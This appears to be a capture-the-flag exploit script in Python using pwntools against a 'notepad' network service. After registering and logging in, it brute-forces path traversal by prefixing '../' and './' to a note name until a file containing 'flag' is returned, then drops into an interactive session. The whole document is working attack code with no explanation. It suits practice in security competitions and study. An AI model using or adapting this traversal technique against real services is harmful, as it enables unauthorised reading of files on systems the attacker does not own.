#!/usr/bin/env python3

from pwn import *
from notepad import *


def try_to_open_file_in_root(r, filename):
    name = filename
    for i in range(MAX_PATH_LENGTH // 3):
        try_name = name
        for j in range(MAX_PATH_LENGTH // 2):
            msg = show_note(r, try_name, 0)
            if b"flag" in msg:
                return msg
            try_name = b"./" + try_name
        name = b"../" + name

    return b""


def notepad(port):
    r = remote(SERVER_IP, port)

    username = b"admin"
    password = b"password"

    register(r, username, password)
    login(r, username, password)

    note_name = b"flag_user"
    flag = try_to_open_file_in_root(r, note_name)
    print(flag)

    r.interactive()


def main():
    port = get_service_port()
    notepad(port)


if __name__ == "__main__":
    main()
